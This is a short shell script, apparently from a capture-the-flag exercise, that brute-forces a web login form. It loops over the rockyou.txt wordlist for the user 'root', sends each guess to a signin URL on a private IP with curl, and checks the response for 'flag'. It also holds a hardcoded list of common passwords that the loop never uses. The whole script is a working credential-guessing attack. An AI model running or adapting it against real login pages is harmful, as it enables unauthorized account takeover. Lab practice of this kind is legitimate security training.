#!/bin/sh
commonPasswd=('123456'
'123456789'
'qwerty'
'12345678'
'111111'
'1234567890'
'1234567'
'rockyou'
'password'
'123123'
'987654321'
'qwertyuiop'
'mynoob'
'123321'
'666666'
'18atcskd2w'
'7777777'
'1q2w3e4r'
'654321'
'555555'
'3rjs1la7qe'
'google'
'1q2w3e4r5t'
'123qwe'
'zxcvbnm'
'1q2w3e'
'root'
'admin'
'dragon'
'123456'
'12345'
'123456789'
'Password'
'iloveyou'
'princess'
'rockyou'
'1234567'
'12345678'
'abc123'
);

commonLogin=('root');
#tested for : 'root' 'admin' 'dragon' 'user' 'flag' 'darkly' 'login' 'username' 'marvin' 'laurie' 'zaz' 'thor' 'ly' 'mathieu' 'prism'

for login in "${commonLogin[@]}"
do
	input="./rockyou.txt"
	while IFS= read -r passwd
	do
		echo "testing $login with $passwd"
		curl -s "http://10.11.200.246/?page=signin&username=$login&password=$passwd&Login=Login#" | grep -i "flag"
	done < "$input"
done
